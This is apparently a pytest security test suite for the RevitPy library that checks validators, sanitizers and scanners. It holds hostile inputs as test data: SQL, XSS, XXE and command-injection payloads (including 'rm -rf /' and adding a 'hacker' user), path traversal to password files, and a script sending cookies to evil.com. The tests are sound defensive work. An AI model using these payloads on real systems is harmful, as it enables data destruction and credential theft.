"""Security tests for input validation and sanitization.

This module contains comprehensive security tests to ensure RevitPy
properly validates and sanitizes all inputs to prevent security vulnerabilities.
"""

import json
import os
import tempfile
from pathlib import Path
from typing import Dict, List, Any
from unittest.mock import MagicMock, patch

import pytest

from revitpy.api.wrapper import RevitAPIWrapper
from revitpy.api.exceptions import RevitValidationError, RevitSecurityError
from revitpy.security.validator import InputValidator, SecurityScanner
from revitpy.security.sanitizer import DataSanitizer


class TestInputValidation:
    """Test input validation security measures."""
    
    @pytest.fixture
    def validator(self):
        """Create input validator instance."""
        return InputValidator()
    
    @pytest.fixture
    def security_scanner(self):
        """Create security scanner instance."""
        return SecurityScanner()
    
    @pytest.fixture
    def sanitizer(self):
        """Create data sanitizer instance."""
        return DataSanitizer()
    
    @pytest.mark.security
    @pytest.mark.parametrize("malicious_input", [
        "'; DROP TABLE elements; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "; DELETE FROM projects; --",
        "'; INSERT INTO users VALUES('hacker', 'password'); --"
    ])
    def test_sql_injection_prevention(self, validator, malicious_input):
        """Test prevention of SQL injection attacks."""
        with pytest.raises(RevitSecurityError) as exc_info:
            validator.validate_query_parameter("element_name", malicious_input)
        
        assert "sql injection" in str(exc_info.value).lower()
    
    @pytest.mark.security
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "<iframe src=javascript:alert('xss')></iframe>",
        "onmouseover=alert('xss')",
        "<body onload=alert('xss')>"
    ])
    def test_xss_prevention(self, validator, xss_payload):
        """Test prevention of XSS attacks."""
        with pytest.raises(RevitSecurityError) as exc_info:
            validator.validate_html_content("description", xss_payload)
        
        assert "xss" in str(exc_info.value).lower()
    
    @pytest.mark.security
    @pytest.mark.parametrize("path_traversal", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/.././.././etc/passwd",
        "\\..\\..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd"
    ])
    def test_path_traversal_prevention(self, validator, path_traversal):
        """Test prevention of path traversal attacks."""
        with pytest.raises(RevitSecurityError) as exc_info:
            validator.validate_file_path("config_file", path_traversal)
        
        assert "path traversal" in str(exc_info.value).lower()
    
    @pytest.mark.security
    @pytest.mark.parametrize("command_injection", [
        "test; rm -rf /",
        "test && rm -rf /",
        "test | rm -rf /",
        "test`rm -rf /`",
        "test$(rm -rf /)",
        "test; shutdown -r now",
        "test && net user hacker password /add"
    ])
    def test_command_injection_prevention(self, validator, command_injection):
        """Test prevention of command injection attacks."""
        with pytest.raises(RevitSecurityError) as exc_info:
            validator.validate_system_command("build_command", command_injection)
        
        assert "command injection" in str(exc_info.value).lower()
    
    @pytest.mark.security
    def test_oversized_input_rejection(self, validator):
        """Test rejection of oversized inputs."""
        # Test string length limits
        oversized_string = "x" * (10 * 1024 * 1024)  # 10MB string
        
        with pytest.raises(RevitValidationError) as exc_info:
            validator.validate_string_input("element_name", oversized_string, max_length=1000)
        
        assert "too long" in str(exc_info.value).lower()
    
    @pytest.mark.security
    def test_malformed_json_rejection(self, validator):
        """Test rejection of malformed JSON inputs."""
        malformed_json_inputs = [
            "{ invalid json }",
            '{"key": }',
            '{"key": "value"',  # Missing closing brace
            '{"key": "value",}',  # Trailing comma
            "{key: 'value'}",  # Unquoted key
            "{'key': 'value'}",  # Single quotes
        ]
        
        for malformed_json in malformed_json_inputs:
            with pytest.raises(RevitValidationError):
                validator.validate_json_input("parameters", malformed_json)
    
    @pytest.mark.security
    def test_invalid_element_id_rejection(self, validator):
        """Test rejection of invalid element IDs."""
        invalid_element_ids = [
            -1,  # Negative ID
            0,   # Zero ID (typically invalid in Revit)
            "not_a_number",
            3.14,  # Float when integer expected
            "12345; DROP TABLE elements;",  # SQL injection attempt
            None,
            "",
            [],
            {}
        ]
        
        for invalid_id in invalid_element_ids:
            with pytest.raises(RevitValidationError):
                validator.validate_element_id("element_id", invalid_id)
    
    @pytest.mark.security
    def test_file_extension_validation(self, validator):
        """Test file extension validation."""
        # Dangerous file extensions
        dangerous_files = [
            "script.exe",
            "malware.bat",
            "trojan.scr",
            "virus.com",
            "backdoor.pif",
            "harmful.vbs"
        ]
        
        allowed_extensions = [".rvt", ".rfa", ".rte", ".rtf", ".txt", ".json", ".xml"]
        
        for dangerous_file in dangerous_files:
            with pytest.raises(RevitSecurityError):
                validator.validate_file_extension("file_path", dangerous_file, allowed_extensions)
    
    @pytest.mark.security
    def test_numeric_range_validation(self, validator):
        """Test numeric range validation."""
        # Test integer ranges
        with pytest.raises(RevitValidationError):
            validator.validate_integer_range("height", -100, min_value=0, max_value=10000)
        
        with pytest.raises(RevitValidationError):
            validator.validate_integer_range("height", 50000, min_value=0, max_value=10000)
        
        # Test float ranges
        with pytest.raises(RevitValidationError):
            validator.validate_float_range("width", -5.5, min_value=0.0, max_value=1000.0)
        
        with pytest.raises(RevitValidationError):
            validator.validate_float_range("width", 2000.5, min_value=0.0, max_value=1000.0)


class TestAPISecurityValidation:
    """Test security validation in API operations."""
    
    @pytest.fixture
    def mock_bridge(self):
        """Mock bridge for security testing."""
        bridge = MagicMock()
        bridge.IsConnected = True
        return bridge
    
    @pytest.fixture
    def api_wrapper(self, mock_bridge):
        """API wrapper with security validation enabled."""
        wrapper = RevitAPIWrapper(config={"enable_security_validation": True})
        wrapper._bridge = mock_bridge
        wrapper._connected = True
        return wrapper
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_malicious_api_parameters(self, api_wrapper):
        """Test API parameter validation against malicious inputs."""
        malicious_parameters = {
            "elementId": "'; DROP TABLE elements; --",
            "script": "<script>alert('xss')</script>",
            "fileName": "../../../etc/passwd",
            "command": "test; rm -rf /"
        }
        
        with pytest.raises(RevitSecurityError):
            await api_wrapper.call_api("GetElement", malicious_parameters)
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_oversized_api_payload(self, api_wrapper):
        """Test API payload size limits."""
        # Create oversized payload (10MB)
        oversized_data = "x" * (10 * 1024 * 1024)
        large_parameters = {"data": oversized_data}
        
        with pytest.raises(RevitValidationError) as exc_info:
            await api_wrapper.call_api("ProcessData", large_parameters)
        
        assert "payload too large" in str(exc_info.value).lower()
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_api_rate_limiting(self, api_wrapper):
        """Test API rate limiting for security."""
        # Configure rate limiting
        api_wrapper._rate_limiter.configure(max_calls=10, time_window=60)
        
        # Make calls up to the limit
        for i in range(10):
            await api_wrapper.call_api("TestMethod", {"id": i})
        
        # 11th call should be rate limited
        with pytest.raises(RevitSecurityError) as exc_info:
            await api_wrapper.call_api("TestMethod", {"id": 11})
        
        assert "rate limit" in str(exc_info.value).lower()
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_unauthorized_method_access(self, api_wrapper):
        """Test unauthorized method access prevention."""
        # Mock user context without admin privileges
        with patch.object(api_wrapper, '_current_user') as mock_user:
            mock_user.permissions = ["read"]  # No admin permissions
            
            # Attempt to call admin-only method
            with pytest.raises(RevitSecurityError) as exc_info:
                await api_wrapper.call_api("DeleteAllElements", {})
            
            assert "unauthorized" in str(exc_info.value).lower()


class TestDataSanitization:
    """Test data sanitization functionality."""
    
    @pytest.fixture
    def sanitizer(self):
        """Create data sanitizer instance."""
        return DataSanitizer()
    
    @pytest.mark.security
    def test_html_sanitization(self, sanitizer):
        """Test HTML content sanitization."""
        dirty_html = """
        <div>Safe content</div>
        <script>alert('xss')</script>
        <img src=x onerror=alert('xss')>
        <p>More safe content</p>
        """
        
        clean_html = sanitizer.sanitize_html(dirty_html)
        
        # Script tags should be removed
        assert "<script>" not in clean_html
        assert "alert('xss')" not in clean_html
        assert "onerror=" not in clean_html
        
        # Safe content should remain
        assert "Safe content" in clean_html
        assert "More safe content" in clean_html
    
    @pytest.mark.security
    def test_sql_parameter_sanitization(self, sanitizer):
        """Test SQL parameter sanitization."""
        malicious_input = "'; DROP TABLE elements; --"
        sanitized = sanitizer.sanitize_sql_parameter(malicious_input)
        
        # Should escape or remove dangerous SQL characters
        assert "DROP TABLE" not in sanitized
        assert "--" not in sanitized
        assert ";" not in sanitized
    
    @pytest.mark.security
    def test_file_path_sanitization(self, sanitizer):
        """Test file path sanitization."""
        malicious_paths = [
            "../../../etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "..\\..\\dangerous\\file.exe"
        ]
        
        for malicious_path in malicious_paths:
            sanitized = sanitizer.sanitize_file_path(malicious_path)
            
            # Path traversal patterns should be removed
            assert ".." not in sanitized
            assert "\\..\\" not in sanitized
            assert "/../" not in sanitized
    
    @pytest.mark.security
    def test_command_sanitization(self, sanitizer):
        """Test command sanitization."""
        malicious_commands = [
            "build.exe; rm -rf /",
            "compile && shutdown -r now",
            "test | cat /etc/passwd"
        ]
        
        for malicious_command in malicious_commands:
            sanitized = sanitizer.sanitize_command(malicious_command)
            
            # Command injection patterns should be removed
            assert ";" not in sanitized
            assert "&&" not in sanitized
            assert "|" not in sanitized
            assert "`" not in sanitized
            assert "$(" not in sanitized


class TestSecurityScanner:
    """Test security scanning functionality."""
    
    @pytest.fixture
    def scanner(self):
        """Create security scanner instance."""
        return SecurityScanner()
    
    @pytest.mark.security
    def test_vulnerability_detection(self, scanner):
        """Test detection of known vulnerabilities."""
        # Test data containing various vulnerabilities
        test_data = {
            "user_input": "<script>alert('xss')</script>",
            "sql_query": "SELECT * FROM users WHERE id = '; DROP TABLE users; --",
            "file_path": "../../../etc/passwd",
            "command": "test; rm -rf /"
        }
        
        vulnerabilities = scanner.scan_data(test_data)
        
        # Should detect multiple vulnerability types
        vuln_types = [vuln["type"] for vuln in vulnerabilities]
        assert "xss" in vuln_types
        assert "sql_injection" in vuln_types
        assert "path_traversal" in vuln_types
        assert "command_injection" in vuln_types
    
    @pytest.mark.security
    def test_content_scanning(self, scanner):
        """Test content scanning for malicious patterns."""
        malicious_content = """
        function malicious() {
            eval(userInput);
            document.write(unsafeData);
            window.location = 'http://evil.com/steal?data=' + document.cookie;
        }
        """
        
        vulnerabilities = scanner.scan_content(malicious_content)
        
        # Should detect dangerous JavaScript patterns
        assert any(vuln["pattern"] == "eval(" for vuln in vulnerabilities)
        assert any(vuln["pattern"] == "document.write(" for vuln in vulnerabilities)
    
    @pytest.mark.security
    def test_file_scanning(self, scanner):
        """Test file scanning for security issues."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write("""
import subprocess
import os

def dangerous_function():
    # Direct command execution - security risk
    subprocess.call(user_input, shell=True)
    os.system(untrusted_command)
    exec(user_provided_code)
""")
            temp_file = f.name
        
        try:
            vulnerabilities = scanner.scan_file(temp_file)
            
            # Should detect dangerous function calls
            assert any("subprocess.call" in vuln["context"] for vuln in vulnerabilities)
            assert any("os.system" in vuln["context"] for vuln in vulnerabilities)
            assert any("exec(" in vuln["context"] for vuln in vulnerabilities)
        
        finally:
            os.unlink(temp_file)


class TestPackageSecurityValidation:
    """Test security validation for package operations."""
    
    @pytest.mark.security
    def test_package_signature_validation(self):
        """Test package signature validation."""
        # This would test digital signature validation for packages
        pytest.skip("Requires package signing infrastructure")
    
    @pytest.mark.security
    def test_dependency_security_scan(self):
        """Test security scanning of package dependencies."""
        # Mock package with known vulnerable dependencies
        package_info = {
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": [
                {"name": "requests", "version": "2.8.0"},  # Old version with vulnerabilities
                {"name": "urllib3", "version": "1.25.0"},  # Old version
            ]
        }
        
        from revitpy.security.package_scanner import PackageSecurityScanner
        scanner = PackageSecurityScanner()
        
        vulnerabilities = scanner.scan_dependencies(package_info["dependencies"])
        
        # Should detect vulnerable dependencies
        assert len(vulnerabilities) > 0
        assert any("requests" in vuln["package"] for vuln in vulnerabilities)
    
    @pytest.mark.security
    def test_package_content_validation(self):
        """Test validation of package contents."""
        # Create temporary package structure
        with tempfile.TemporaryDirectory() as temp_dir:
            package_dir = Path(temp_dir) / "test_package"
            package_dir.mkdir()
            
            # Create potentially dangerous files
            (package_dir / "__init__.py").write_text("print('Hello World')")
            (package_dir / "malicious.exe").write_bytes(b"fake executable")
            (package_dir / "script.bat").write_text("@echo off\nrd /s /q C:\\")
            
            from revitpy.security.package_scanner import PackageContentScanner
            scanner = PackageContentScanner()
            
            security_issues = scanner.scan_package_content(package_dir)
            
            # Should detect dangerous file types
            assert any("executable" in issue["type"] for issue in security_issues)
            assert any("script" in issue["type"] for issue in security_issues)


class TestAccessControlValidation:
    """Test access control and authorization."""
    
    @pytest.mark.security
    def test_file_permission_validation(self):
        """Test file permission validation."""
        with tempfile.NamedTemporaryFile() as temp_file:
            # Set restrictive permissions
            os.chmod(temp_file.name, 0o600)  # Owner read/write only
            
            from revitpy.security.access_control import FilePermissionValidator
            validator = FilePermissionValidator()
            
            # Should detect overly permissive files
            is_secure = validator.validate_file_permissions(temp_file.name)
            assert is_secure
            
            # Test with overly permissive file
            os.chmod(temp_file.name, 0o777)  # World writable
            is_secure = validator.validate_file_permissions(temp_file.name)
            assert not is_secure
    
    @pytest.mark.security
    def test_directory_traversal_protection(self):
        """Test protection against directory traversal."""
        base_directory = "/safe/project/path"
        
        from revitpy.security.access_control import PathValidator
        validator = PathValidator(base_directory)
        
        # Safe paths should be allowed
        safe_paths = [
            "/safe/project/path/file.txt",
            "/safe/project/path/subdir/file.txt"
        ]
        
        for safe_path in safe_paths:
            assert validator.is_path_allowed(safe_path)
        
        # Dangerous paths should be blocked
        dangerous_paths = [
            "/safe/project/../../../etc/passwd",
            "/etc/passwd",
            "/safe/project/path/../../../sensitive/file.txt"
        ]
        
        for dangerous_path in dangerous_paths:
            assert not validator.is_path_allowed(dangerous_path)


class TestCryptographicValidation:
    """Test cryptographic security measures."""
    
    @pytest.mark.security
    def test_weak_encryption_detection(self):
        """Test detection of weak encryption algorithms."""
        from revitpy.security.crypto_validator import CryptoValidator
        validator = CryptoValidator()
        
        # Weak algorithms should be rejected
        weak_algorithms = ["MD5", "SHA1", "DES", "RC4"]
        
        for algorithm in weak_algorithms:
            with pytest.raises(RevitSecurityError):
                validator.validate_encryption_algorithm(algorithm)
    
    @pytest.mark.security
    def test_insecure_random_detection(self):
        """Test detection of insecure random number generation."""
        from revitpy.security.crypto_validator import CryptoValidator
        validator = CryptoValidator()
        
        # Test code that uses insecure random
        insecure_code = """
import random
password = ''.join(random.choices(string.ascii_letters, k=12))
"""
        
        issues = validator.scan_random_usage(insecure_code)
        assert len(issues) > 0
        assert "insecure random" in issues[0]["message"].lower()
    
    @pytest.mark.security
    def test_hardcoded_secrets_detection(self):
        """Test detection of hardcoded secrets."""
        from revitpy.security.secret_scanner import SecretScanner
        scanner = SecretScanner()
        
        code_with_secrets = '''
API_KEY = "sk-1234567890abcdef1234567890abcdef"
DATABASE_PASSWORD = "supersecretpassword123"
JWT_SECRET = "my-super-secret-jwt-key-12345"
'''
        
        secrets = scanner.scan_for_secrets(code_with_secrets)
        
        assert len(secrets) >= 3
        secret_types = [secret["type"] for secret in secrets]
        assert "api_key" in secret_types
        assert "password" in secret_types
        assert "jwt_secret" in secret_types


# Utility functions for security testing
def create_malicious_payload(payload_type: str) -> str:
    """Create malicious payload for testing."""
    payloads = {
        "sql_injection": "'; DROP TABLE elements; --",
        "xss": "<script>alert('xss')</script>",
        "path_traversal": "../../../etc/passwd",
        "command_injection": "; rm -rf /",
        "xxe": '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        "ldap_injection": "admin)(&(password=*))",
        "header_injection": "test\r\nSet-Cookie: admin=true",
    }
    return payloads.get(payload_type, "")


def simulate_attack_vector(attack_type: str, target_function, *args, **kwargs):
    """Simulate various attack vectors for testing."""
    malicious_payload = create_malicious_payload(attack_type)
    
    # Replace first string argument with malicious payload
    modified_args = list(args)
    for i, arg in enumerate(modified_args):
        if isinstance(arg, str):
            modified_args[i] = malicious_payload
            break
    
    return target_function(*modified_args, **kwargs)